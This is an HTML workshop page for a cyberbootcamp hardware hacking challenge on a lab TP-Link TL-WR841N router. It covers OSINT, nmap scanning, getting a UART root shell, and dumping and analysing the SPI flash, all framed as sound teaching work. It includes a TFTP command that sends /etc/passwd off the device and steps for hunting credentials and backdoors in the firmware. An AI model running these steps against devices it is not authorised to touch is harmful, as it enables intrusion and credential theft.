@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hardware Hacking Challenge_</title>
+<meta name="description" content="Hands-on hardware hacking challenge on a TP-Link TL-WR841N router: FCC/OSINT recon, a UART root shell, and SPI flash firmware extraction. A Challenge the Cyber cyberbootcamp 2026 activity by Warpnet & Roald Nefs.">
+
+<!-- Social / SEO. Canonical/OG set to the GitHub Pages URL. Optional: add an og:image (1200x630) for richer link previews. -->
+<link rel="canonical" href="https://warpnet.github.io/cyberbootcamp-2026/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hardware Hacking Challenge · cyberbootcamp 2026">
+<meta property="og:description" content="Crack the case, find the pads, dump the flash. A hands-on TP-Link TL-WR841N challenge: OSINT, a UART root shell, and SPI firmware extraction.">
+<meta property="og:url" content="https://warpnet.github.io/cyberbootcamp-2026/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hardware Hacking Challenge · cyberbootcamp 2026">
+<meta name="twitter:description" content="Crack the case, find the pads, dump the flash. OSINT → UART root shell → SPI firmware extraction on a TP-Link TL-WR841N.">
+
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23F97316'/><rect x='6' y='8' width='20' height='16' rx='2' fill='%23000'/><rect x='9' y='18' width='7' height='2.5' fill='%23F97316'/><rect x='9' y='12' width='3' height='2.5' fill='%23F97316'/><rect x='14' y='12' width='9' height='2.5' fill='%23555'/></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+<script defer src="script.js"></script>
+</head>
+<body>
+
+<div class="tape" aria-hidden="true"></div>
+
+<div class="wrap">
+
+  <header>
+    <div class="meta">
+      <span>HARDWARE HACKING</span>
+      <span>CYBERBOOTCAMP 2026</span>
+    </div>
+    <h1>HACK THE<br>ROUTER<span class="cursor"></span></h1>
+    <p class="subtitle">A hands-on challenge at the <b><a href="https://challengethecyber.nl/cyberbootcamp/" target="_blank" rel="noopener">Challenge the Cyber</a></b> cyberbootcamp 2026, by <b><a href="https://warpnet.nl" target="_blank" rel="noopener">Warpnet</a></b> &amp; <b><a href="https://roaldnefs.com" target="_blank" rel="noopener">Roald Nefs</a></b> &middot; Crack the case, find the pads, dump the flash.</p>
+  </header>
+
+  <!-- Boot log intro -->
+  <div class="bootlog" aria-label="System boot">
+    <div><span class="ok">[OK]</span> target_detected ........ TP-Link TL-WR841N v14</div>
+    <div><span class="ok">[OK]</span> uart_adapter ........... CP2102 USB-TTL</div>
+    <div><span class="ok">[OK]</span> flash_programmer ....... CH341A (SPI)</div>
+    <div><span class="warn">[!!]</span> warranty_void .......... <b>true</b> (that's the point)</div>
+    <div class="prompt">begin_workshop --solder-optional=false</div>
+  </div>
+
+  <p style="font-size:12px;color:var(--dim);text-align:center;">
+    Stuck mid-challenge? Scroll past the challenges for the <a href="#quick-reference">quick reference</a> (pinouts, baud, commands) and <a href="#troubleshooting">troubleshooting / FAQ</a>.
+  </p>
+
+  <!-- INTRO / PRIMER -->
+  <h2>First time? Start here</h2>
+  <p>Every cheap home router is a full <b>Linux computer</b> hiding in a plastic box: a CPU, some RAM, a flash chip holding the firmware, and a few debug pads the manufacturer forgot to lock down. <b>Hardware hacking</b> is the art of talking to that hidden computer directly: reading its serial console, dumping its flash, and pulling the firmware apart to see how it really works. People do it for security research, for repair and repurposing, to run open firmware like OpenWrt, or just to learn how the little box on the shelf actually thinks.</p>
+
+  <h3>Why a router?</h3>
+  <p>A budget SOHO router is the perfect first target. It's <b>cheap</b> (a tenner second-hand), it <b>can't hurt you</b>, and it makes almost every classic beginner mistake: an <b>unlocked UART</b> that drops you to a root shell, an <b>unencrypted SPI flash</b> you can read with a clip, and a stock <b>Linux userland</b> full of interesting files. Brick it? Re-flash it from the SPI dump and start over. Worst case you're out a ten-euro router.</p>
+
+  <h3>Your target: TP-Link TL-WR841N v14</h3>
+  <p>A wildly common 300 Mbps N router. This one runs a <b>MediaTek MT7628NN</b> MIPS SoC at 575 MHz, with <b>4 MB</b> of <b>SPI NOR flash</b> and <b>32 MB</b> of RAM, booting <b>U-Boot</b> into a Linux firmware. That's the whole stack you'll pull apart today.</p>
+  <div class="note warn">
+    <div class="label">⚠ Hardware revisions differ</div>
+    The TL-WR841N shipped in many hardware versions (…v13, v14…) and the SoC, flash chip, pad layout, and firmware <b>all vary between them</b>. Bench boards are <b>v14</b>, but everything below is still a starting point, so <b>read the markings on your own board</b> and verify by observation. That's half the challenge.
+  </div>
+
+  <h3>The loop you'll repeat</h3>
+  <dl class="pinout">
+    <dt>01</dt><dd><b>Recon</b> &nbsp;· OSINT the model: FCC filings, datasheets, stock firmware.</dd>
+    <dt>02</dt><dd><b>Open</b> &nbsp;· screwdriver off the case, eyes on the board.</dd>
+    <dt>03</dt><dd><b>Probe</b> &nbsp;· multimeter + logic analyzer to find the debug pads.</dd>
+    <dt>04</dt><dd><b>Interface</b> &nbsp;· solder a header, talk UART, get a shell.</dd>
+    <dt>05</dt><dd><b>Extract</b> &nbsp;· TFTP files out, or clip the flash and dump it.</dd>
+    <dt>06</dt><dd><b>Analyze</b> &nbsp;· binwalk the image, hunt for secrets.</dd>
+  </dl>
+
+  <div class="note">
+    <div class="label">// Don't memorise this</div>
+    This page is a tour, not a textbook. Skim what you need for the challenge you're on and come back later. Every section links to the <a href="#quick-reference">quick reference</a> for the exact commands and pinouts.
+  </div>
+
+  <!-- WHAT YOU GET -->
+  <h2>Your kit</h2>
+  <p>At your station you'll find a <b>TL-WR841N v14</b> target board, a host <b>laptop</b>, and the following tools. Grab what a challenge calls for:</p>
+
+  <table class="ref">
+    <thead>
+      <tr><th>Tool</th><th>What it's for</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><b>CP2102 USB-UART adapter</b></td><td>Bridges the board's 3.3V serial console to a USB port → your terminal</td></tr>
+      <tr><td><b>Digital multimeter</b></td><td>Continuity to find GND; DC volts to spot VCC, identify the UART pads</td></tr>
+      <tr><td><b>Logic analyzer (8CH, 24MHz)</b></td><td>Confirm which pad is TX by watching it chatter on boot; decode the UART</td></tr>
+      <tr><td><b>CH341A USB programmer</b></td><td>Reads/writes the SPI flash chip directly via a SOIC-8 clip</td></tr>
+      <tr><td><b>Screwdriver</b></td><td>Open the case; there's usually a screw hiding under a rubber foot or label</td></tr>
+      <tr><td><b>Male header pins</b></td><td>Solder into the UART pads so you can attach jumper wires cleanly</td></tr>
+      <tr><td><b>Soldering station</b></td><td>Tack the header pins in place, a few clean joints, not a sculpture</td></tr>
+      <tr><td><b>Jumper wires</b></td><td>Connect adapter ↔ board (Dupont F-F are handy for headers)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="chips">
+    <span class="chip live">UART @ 115200 8N1</span>
+    <span class="chip live">3.3V LOGIC</span>
+    <span class="chip">MIND THE 5V</span>
+  </div>
+
+  <!-- SAFETY -->
+  <div class="note danger">
+    <div class="label">⚠ Disclaimer</div>
+    Educational purposes only. These are <b>lab boards you're allowed to break</b>. Only hack hardware you own. The board runs on <b>3.3V logic</b>. The CP2102's TX and the CH341A's data lines can be 5V, which will damage the SoC or flash. Never connect the adapter's <b>VCC</b> line to a board that already has its own power. Ask a volunteer if you're unsure.
+  </div>
+
+  <!-- ============ CHALLENGES ============ -->
+  <h2>Challenges</h2>
+  <p>Work through these at your own pace, roughly top to bottom, since each section builds on the last. Bring your sheet to the desk when you've cleared a few; there are stickers.</p>
+
+  <!-- ===================================================== -->
+  <h2 style="border:none;">Section 1 // Initial recon &amp; OSINT</h2>
+  <p>Before you pick up a screwdriver, learn everything the internet already knows about this box.</p>
+
+  <h3>Challenge 01 // Hardware OSINT &amp; FCC ID</h3>
+  <p>Every device sold in the US carries an <b>FCC ID</b>, and the FCC publishes the manufacturer's filing: external photos, RF test reports, and user manuals. When the vendor doesn't ask for confidentiality you also get <b>internal photos</b>, block diagrams, and schematics, a free teardown before you even open the box.</p>
+  <p style="font-size:12px;color:var(--dim);">Flip the router over. The FCC ID is printed on the label. TP-Link's newer grantee code is <code class="inline">2AXJ4</code>, so the ID reads <code class="inline">2AXJ4-WR841NV14</code>. Look it up on <a href="https://fcc.io" target="_blank" rel="noopener">fcc.io</a> or <a href="https://fccid.io" target="_blank" rel="noopener">fccid.io</a>. Heads-up: for this device TP-Link filed the internals as <b>confidential</b>, so you'll find external photos and confidentiality letters, not internal shots. Spotting what's withheld is part of the recon.</p>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Find the FCC ID on the bottom label <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Open the FCC filing; note what's public (external photos) vs withheld (confidentiality letters) <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Confirm the exact hardware version (it's on the label as <code class="inline">Ver</code> / <code class="inline">TPD</code>) <span class="pts">+10</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 02 // Embedded system components</h3>
+  <p>Open the case and read the board like a map. The three chips that matter: the <b>SoC</b> (the CPU), the <b>RAM</b>, and the <b>SPI flash</b> (where the firmware lives). Every chip has its part number printed on top. A phone torch and a macro photo help.</p>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Identify the main SoC from its top marking <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Identify the SPI flash chip part number <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Identify the RAM / SDRAM chip <span class="pts">+10</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 03 // Locating &amp; reading datasheets</h3>
+  <p>A part number is a key. Search it and you get the <b>datasheet</b>, the chip's own manual. For the flash you want <b>pin 1</b>, the <b>operating voltage</b>, and the <b>READ opcode</b>; for the SoC you want the <b>UART pins</b> and boot-strap behaviour.</p>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Find the flash datasheet: note pin 1, voltage, and READ opcode <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Find the SoC datasheet / OpenWrt page: note the UART &amp; boot pins <span class="pts">+10</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 04 // Locating firmware online</h3>
+  <p>You don't have to extract the firmware to start reading it. TP-Link hands it out. The <a href="https://www.tp-link.com/support/download/tl-wr841n/" target="_blank" rel="noopener">Download Center</a> has the stock <code class="inline">.bin</code>, and the <a href="https://www.tp-link.com/support/gpl-code/" target="_blank" rel="noopener">GPL Code Center</a> has the open-source parts. Match the file to <b>your exact hardware version</b> (TL-WR841N <b>V14</b>).</p>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Download the stock firmware for your exact hardware version <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Run <code class="inline">binwalk</code> on the vendor image and identify its parts <span class="pts">+15</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 05 // Network setup</h3>
+  <p>Power the router up on the bench and get onto its LAN. Out of the box it's a DHCP server; reach the admin UI at <code class="inline">http://tplinkwifi.net</code> (the URL on the label) or its IP <code class="inline">192.168.0.1</code>.</p>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Get a DHCP lease / reach the LAN <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Log in to the admin web UI <span class="pts">+10</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 06 // NMAP scans</h3>
+  <p>What's actually listening? Point <code class="inline">nmap</code> at the router. Don't stop at the default 1000 ports. Scan the <b>full range</b>, then fingerprint the services.</p>
+  <pre><span class="c"># full TCP sweep + service/version detection</span>
+<span class="k">nmap</span> -p- -sV <span class="p">192.168.0.1</span></pre>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Full TCP port scan (<code class="inline">-p-</code>) of the router <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Service/version detection (<code class="inline">-sV</code>): enumerate what's listening <span class="pts">+15</span></span></label></li>
+  </ul>
+
+  <!-- ===================================================== -->
+  <h2 style="border:none;">Section 2 // UART shell &amp; live enumeration</h2>
+  <p>Time to talk to the hidden computer directly. The UART is a serial console the firmware prints to, and often drops a <b>root shell</b> on, no password.</p>
+
+  <!-- STEP: UART wiring -->
+  <div class="step">
+    <div class="head">
+      <div class="num">→</div>
+      <div class="title">How the UART connects</div>
+    </div>
+    <div class="body">
+      <p>The board exposes 4 pads: <b>GND</b>, <b>VCC</b>, <b>TX</b> (board talks), <b>RX</b> (board listens). You cross TX and RX, share ground, and <b>leave VCC alone</b>. The board powers itself.</p>
+      <table class="ref">
+        <thead>
+          <tr><th>CP2102 pin</th><th>Board pad</th><th>Note</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><b>RX</b></td><td class="id">TX</td><td>board's output → adapter's input</td></tr>
+          <tr><td><b>TX</b></td><td class="id">RX</td><td>adapter's output → board's input</td></tr>
+          <tr><td><b>GND</b></td><td class="id">GND</td><td>common ground, required</td></tr>
+          <tr><td><b>3V3</b></td><td class="id">✗ VCC</td><td><b>do not connect</b>, board is self-powered</td></tr>
+        </tbody>
+      </table>
+      <div class="note warn">
+        <div class="label">⚠ 3.3V only</div>
+        Set the CP2102 jumper to <b>3.3V</b>, never 5V. Feeding 5V into the MT7628's 3.3V UART can kill the SoC.
+      </div>
+    </div>
+  </div>
+
+  <h3>Challenge 07 // Initiating a UART shell</h3>
+  <p>Find the pads, wire them up, and open a console. Which pad is which? <b>GND</b> shows continuity to a known ground (multimeter, continuity mode). <b>VCC</b> sits at a steady 3.3V. <b>TX</b> flickers with data the instant the board boots, so catch it with the logic analyzer (or a multimeter twitching on DC volts). Whatever's left is <b>RX</b>.</p>
+  <pre><span class="c"># open the console once wired (Linux)</span>
+<span class="k">picocom</span> -b <span class="p">115200</span> /dev/ttyUSB0
+<span class="c"># or: screen /dev/ttyUSB0 115200</span></pre>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Identify the 4 UART pads (GND, VCC, TX, RX) with multimeter + logic analyzer <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Solder header pins and wire the CP2102 (TX↔RX, RX↔TX, GND↔GND) <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Open a serial console at 115200 8N1 and get a shell <span class="pts">+30</span></span></label></li>
+  </ul>
+
+  <div class="note warn">
+    <div class="label">⚠ Newer revisions fight back</div>
+    Later hardware revisions add <b>write protection on the console</b>: a <b>pull-up resistor</b> is fitted on the UART <b>RX</b> pad. You can still read the boot log, but the board ignores anything you type, so no interactive shell. The resistor can simply be <b>removed</b> to restore input. Ask a volunteer to help you desolder it.
+  </div>
+
+  <h3>Challenge 08 // Boot logs &amp; the bootloader</h3>
+  <p>Power-cycle the board with the console open and <b>watch it boot</b>. The log is a goldmine: bootloader version, memory map, <b>flash partition offsets</b>, kernel command line, which services start. Most U-Boot builds also let you <b>interrupt</b> the boot. Mash a key (often any key, or <code class="inline">tpl</code>/<code class="inline">Esc</code>) during the countdown to drop to the <code class="inline">=&gt;</code> prompt.</p>
+  <pre><span class="c"># at the U-Boot prompt</span>
+<span class="k">printenv</span>          <span class="c"># boot args, bootcmd, flash layout</span>
+<span class="k">bdinfo</span>            <span class="c"># board info: RAM, clocks</span></pre>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Capture the full power-on boot log <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Identify the bootloader (U-Boot) version and the kernel/rootfs flash offsets <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Interrupt boot and reach the U-Boot prompt <span class="pts">+20</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 09 // Using TFTP to exfil files <span class="stamp">CAUTION</span></h3>
+  <p>Once you have a shell, get files <b>off</b> the box. The BusyBox userland ships a <code class="inline">tftp</code> client, so stand up a <b>TFTP server</b> on your laptop and push files to it, no SD card, no USB, just the network.</p>
+  <pre><span class="c"># on the router shell: push a file to your host</span>
+<span class="k">tftp</span> -p -l /etc/passwd <span class="p">192.168.0.100</span>
+<span class="c"># -p = put, -l = local file, then the host IP</span></pre>
+  <div class="note warn">
+    <div class="label">⚠ Same network</div>
+    Your host's TFTP server has to be reachable from the router: same subnet, firewall open on UDP/69. If a transfer hangs, that's almost always the firewall or a wrong host IP.
+  </div>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Stand up a TFTP server on your host <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Exfil a config / credential file (e.g. <code class="inline">/etc/passwd</code>) <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Exfil a wider slice: nvram / the <code class="inline">/etc</code> tree <span class="pts">+20</span></span></label></li>
+  </ul>
+
+  <!-- ===================================================== -->
+  <h2 style="border:none;">Section 3 // SPI &amp; firmware extraction</h2>
+  <p>The UART gives you a <i>running</i> filesystem. The SPI flash gives you <b>everything</b>: bootloader, kernel, rootfs, and the config partition, byte for byte, whether the OS wants to show it to you or not.</p>
+
+  <h3>Challenge 10 // Dump the SPI flash <span class="stamp">CAUTION</span></h3>
+  <p>Clip the <b>CH341A</b> onto the SOIC-8 flash chip and read it. Line up <b>pin 1</b> (the dot on the chip) with pin 1 of the clip. Read the whole chip <b>twice</b> and compare. A clip that's slightly off gives a dump that changes between reads.</p>
+  <pre><span class="c"># read the flash with flashrom via the CH341A</span>
+<span class="k">flashrom</span> -p ch341a_spi -r dump1.bin
+<span class="k">flashrom</span> -p ch341a_spi -r dump2.bin
+<span class="k">sha256sum</span> dump1.bin dump2.bin   <span class="c"># must match</span></pre>
+  <div class="note danger">
+    <div class="label">⚠ The CH341A 5V flaw</div>
+    Many CH341A boards drive their data lines at <b>5V</b> even in "3.3V" mode, enough to stress a 3.3V flash over time. Use a 3.3V-modded programmer or a level-safe adapter if one's provided, and <b>power the board off</b> before clipping on.
+  </div>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task">Identify and clip the CH341A onto the SOIC-8 flash (mind 3.3V) <span class="pts">+15</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Read the full flash image with <code class="inline">flashrom</code> <span class="pts">+30</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Verify the dump: two reads match <span class="pts">+15</span></span></label></li>
+  </ul>
+
+  <h3>Challenge 11 // Analyze the firmware</h3>
+  <p>You have a raw flash image. Now take it apart. <code class="inline">binwalk</code> spots the bootloader, the kernel (uImage), and the <b>SquashFS root filesystem</b>, and can carve them out. Mount or browse the rootfs and go hunting: password hashes in <code class="inline">/etc/passwd</code> &amp; <code class="inline">/etc/shadow</code>, keys and certs, telnet/backdoor scripts, hardcoded Wi-Fi or admin creds.</p>
+  <pre><span class="c"># extract everything binwalk recognises</span>
+<span class="k">binwalk</span> -e dump1.bin
+<span class="c"># then dig through the carved squashfs-root/</span>
+<span class="k">grep</span> -R <span class="p">"password"</span> squashfs-root/etc</pre>
+  <p style="font-size:12px;color:var(--dim);">Diff your extracted rootfs against the vendor firmware from Challenge 04. Differences are where the config, calibration, and secrets live.</p>
+  <ul class="mission">
+    <li><label><input type="checkbox"><span class="task"><code class="inline">binwalk -e</code> the dump and extract the SquashFS root filesystem <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Find hardcoded credentials / password hashes <span class="pts">+25</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Find something juicy: a private key, telnet/backdoor, or a telling diff vs vendor firmware <span class="pts">+30</span></span></label></li>
+  </ul>
+
+  <!-- QUICK REFERENCE -->
+  <h2 id="quick-reference">Quick reference</h2>
+
+  <h3>UART</h3>
+  <table class="ref">
+    <thead>
+      <tr><th>Setting</th><th>Value</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Baud</td><td class="id">115200</td></tr>
+      <tr><td>Framing</td><td class="id">8N1</td></tr>
+      <tr><td>Logic level</td><td class="id">3.3V TTL</td></tr>
+      <tr><td>Wiring</td><td>adapter RX ← board TX · adapter TX → board RX · GND↔GND · <b>VCC not connected</b></td></tr>
+    </tbody>
+  </table>
+
+  <h3>SPI flash (SOIC-8, GD25Q32 · 4MB @ 3.3V)</h3>
+  <pre>      ┌──────┐
+ <span class="k">CS</span> ──┤1•   8├── <span class="k">VCC</span> (3V3)   <span class="c"># pin 1 = dot corner</span>
+ <span class="k">DO</span> ──┤2    7├── <span class="k">HOLD</span>
+ <span class="k">WP</span> ──┤3    6├── <span class="k">CLK</span>
+<span class="k">GND</span> ──┤4    5├── <span class="k">DI</span>
+      └──────┘</pre>
+
+  <h3>Commands</h3>
+  <pre><span class="c"># serial console</span>
+<span class="k">picocom</span> -b 115200 /dev/ttyUSB0
+
+<span class="c"># network recon</span>
+<span class="k">nmap</span> -p- -sV 192.168.0.1
+
+<span class="c"># TFTP server on host (one option)</span>
+<span class="k">sudo</span> dnsmasq --enable-tftp --tftp-root=/srv/tftp -d
+
+<span class="c"># dump + analyse flash</span>
+<span class="k">flashrom</span> -p ch341a_spi -r dump.bin
+<span class="k">binwalk</span> -e dump.bin</pre>
+
+  <h3>Handy facts</h3>
+  <table class="ref">
+    <tbody>
+      <tr><td>Admin UI / LAN IP</td><td class="id">tplinkwifi.net · 192.168.0.1</td></tr>
+      <tr><td>TP-Link FCC grantee code</td><td class="id">2AXJ4</td></tr>
+      <tr><td>SoC</td><td class="id">MediaTek MT7628NN @575 MHz</td></tr>
+      <tr><td>Flash</td><td class="id">GD25Q32 · 4MB (SPI NOR)</td></tr>
+      <tr><td>RAM</td><td class="id">32MB (Zentel A3S56D40)</td></tr>
+      <tr><td>Bootloader</td><td class="id">U-Boot</td></tr>
+    </tbody>
+  </table>
+  <p style="font-size:12px;color:var(--dim);">Exact pinouts, chips, and offsets vary by hardware revision. Verify against <i>your</i> board. That's the whole game.</p>
+
+  <!-- TROUBLESHOOTING -->
+  <h2 id="troubleshooting">Troubleshooting</h2>
+
+  <details>
+    <summary>Console connects but shows nothing (or freezes on boot)</summary>
+    <div class="content">
+      <p>Nine times out of ten it's <b>TX/RX swapped</b>. Flip the two signal wires. Also confirm a <b>common ground</b> between adapter and board, and that the baud is <b>115200</b>. If the board never boots when the adapter's attached, you may have wired VCC. Disconnect it.</p>
+    </div>
+  </details>
+
+  <details>
+    <summary>Boot log is garbled / random characters</summary>
+    <div class="content">
+      <p>That's a <b>baud mismatch</b>. Most of these boards are 115200, but a few use 57600. Try 57600, and make sure framing is 8N1. Garbage that's <i>rhythmic</i> with the boot is almost always the wrong baud, not bad wiring.</p>
+    </div>
+  </details>
+
+  <details>
+    <summary>flashrom can't find the chip / reads all 0xFF or 0x00</summary>
+    <div class="content">
+      <p>The clip isn't making contact on every pin. Reseat it and check <b>pin 1 alignment</b> (the dot). <b>Power the board off</b> before dumping; a powered board fights the programmer. If flashrom sees the chip but reads look wrong, suspect the CH341A's <b>5V data-line</b> issue and use a 3.3V-safe programmer.</p>
+    </div>
+  </details>
+
+  <details>
+    <summary>TFTP transfer just hangs</summary>
+    <div class="content">
+      <p>The router can't reach your TFTP server. Check you're on the <b>same subnet</b>, the <b>host firewall</b> allows UDP/69, the <b>tftp-root</b> exists and is writable, and you're pointing at your host's actual IP (not the router's).</p>
+    </div>
+  </details>
+
+  <details>
+    <summary>I want to do this at home</summary>
+    <div class="content">
+      <p>The whole kit lands around €40–€70: a TL-WR841N (or any cheap junkyard router) for a tenner, a CP2102 adapter and a CH341A programmer with a SOIC-8 clip for a few euro each, and a basic multimeter. A cheap 8-channel logic analyzer is optional but makes finding TX painless. Everything else (binwalk, flashrom, nmap, picocom) is free.</p>
+    </div>
+  </details>
+
+  <!-- SCORE -->
+  <h2>Your score</h2>
+  <div class="score" id="score">
+    <div class="label">// Total points captured</div>
+    <div class="digits">
+      <span class="total" id="scoreTotal">0</span>
+      <span class="of">/ <span id="scoreMax">0</span> pts</span>
+    </div>
+    <div class="bar"><div class="fill" id="scoreFill"></div></div>
+    <div class="meta-row">
+      <span><span id="scoreCount">0</span> / <span id="scoreOf">0</span> objectives</span>
+      <span class="rank" id="scoreRank">SCREWDRIVER ROOKIE</span>
+    </div>
+    <button class="reset" id="scoreReset" type="button">Reset all</button>
+
+    <div class="celebration" id="celebration" role="status" aria-live="polite">
+      <div class="crown">👑</div>
+      <div class="title">Firmware Overlord</div>
+      <div class="sub">// All objectives captured. The router is yours, byte for byte.</div>
+      <button class="cta" id="celebCta" type="button">↓ Now go brag</button>
+    </div>
+  </div>
+
+  <!-- Confetti container, populated by JS on completion -->
+  <div class="confetti" id="confetti" aria-hidden="true"></div>
+
+  <!-- SHARE -->
+  <h2>Brag about it</h2>
+  <p>Popped a shell, dumped the flash, earned the rank? Post about it on LinkedIn. Here's who to tag and what to link.</p>
+
+  <div class="share">
+    <h3 style="margin-top:0;">People &amp; pages to mention</h3>
+    <ul style="list-style:none;padding-left:0;font-size:14px;margin-bottom:18px;">
+      <li style="padding:8px 0;">
+        → <b>Challenge the Cyber</b> &middot; <a href="https://www.linkedin.com/company/challengethecyber/" target="_blank" rel="noopener">linkedin.com/company/challengethecyber</a> &middot; <a href="https://challengethecyber.nl/cyberbootcamp/" target="_blank" rel="noopener">challengethecyber.nl</a>
+      </li>
+      <li style="padding:8px 0;">
+        → <b>Roald Nefs</b> &middot; <a href="https://www.linkedin.com/in/roaldnefs/" target="_blank" rel="noopener">linkedin.com/in/roaldnefs</a> &middot; <a href="https://roaldnefs.com" target="_blank" rel="noopener">roaldnefs.com</a>
+      </li>
+      <li style="padding:8px 0;">
+        → <b>Warpnet</b> &middot; <a href="https://www.linkedin.com/company/warpnet" target="_blank" rel="noopener">linkedin.com/company/warpnet</a> &middot; <a href="https://warpnet.nl" target="_blank" rel="noopener">warpnet.nl</a>
+      </li>
+    </ul>
+
+    <h3>Suggested hashtags</h3>
+    <p style="font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--accent-ink);margin-bottom:18px;line-height:1.7;">
+      #HardwareHacking #IoTSecurity #UART #FirmwareExtraction #ChallengeTheCyber
+    </p>
+
+    <a class="btn btn-primary" href="https://www.linkedin.com/feed/?shareActive=true" target="_blank" rel="noopener" style="display:block;text-align:center;text-decoration:none;">
+      ↗ Open LinkedIn composer
+    </a>
+
+    <p style="font-size:11px;color:var(--dim);margin-top:14px;letter-spacing:0.04em;">
+      Tip: in the LinkedIn composer, type <code class="inline">@</code> followed by a name to get the proper @-mention. It won't auto-link from a paste.
+    </p>
+  </div>
+
+  <!-- RESOURCES -->
+  <h2>Going deeper</h2>
+  <ul style="list-style:none;padding-left:0;font-size:14px;">
+    <li style="padding:6px 0;border-bottom:1px dotted var(--rule);">
+      → <a href="https://github.com/JulianOzelRose/TL-WR841N-v14" target="_blank" rel="noopener">TL-WR841N-v14 · UART root, TFTP &amp; SPI extraction walkthrough (exact model)</a>
+    </li>
+    <li style="padding:6px 0;border-bottom:1px dotted var(--rule);">
+      → <a href="https://www.thezdi.com/blog/2019/9/2/mindshare-hardware-reversing-with-the-tp-link-tl-wr841n-router" target="_blank" rel="noopener">Hardware Reversing with the TP-Link TL-WR841N · ZDI MindShaRE</a>
+    </li>
+    <li style="padding:6px 0;border-bottom:1px dotted var(--rule);">
+      → <a href="https://fcc.io" target="_blank" rel="noopener">fcc.io · FCC ID lookup (photos, test reports &amp; filings)</a>
+    </li>
+    <li style="padding:6px 0;border-bottom:1px dotted var(--rule);">
+      → <a href="https://github.com/ReFirmLabs/binwalk" target="_blank" rel="noopener">binwalk · firmware analysis &amp; extraction</a>
+    </li>
+    <li style="padding:6px 0;border-bottom:1px dotted var(--rule);">
+      → <a href="https://www.flashrom.org/" target="_blank" rel="noopener">flashrom · read/write SPI flash chips</a>
+    </li>
+    <li style="padding:6px 0;border-bottom:1px dotted var(--rule);">
+      → <a href="https://openwrt.org/toh/tp-link/tl-wr841n" target="_blank" rel="noopener">OpenWrt · TL-WR841N device page</a>
+    </li>
+    <li style="padding:6px 0;">
+      → <a href="https://nostarch.com/hardwarehacking" target="_blank" rel="noopener">The Hardware Hacking Handbook · Woudenberg &amp; O'Flynn</a>
+    </li>
+  </ul>
+
+  <footer>
+    <div class="row">
+      <span>HARDWARE HACKING · CYBERBOOTCAMP 2026</span>
+      <span><a href="https://warpnet.nl" target="_blank" rel="noopener">warpnet.nl</a> &middot; <a href="https://roaldnefs.com" target="_blank" rel="noopener">roaldnefs.com</a></span>
+    </div>
+    <div class="row" style="margin-top:14px;color:var(--dim);font-size:11px;letter-spacing:0.1em;">
+      <span>CREATED BY WARPNET &amp; ROALD NEFS · FOR CHALLENGE THE CYBER</span>
+      <span class="blink" style="color:var(--accent);">_</span>
+    </div>
+  </footer>
+
+</div>
+
+<div class="tape warn" aria-hidden="true"></div>
+
+</body>
+</html>
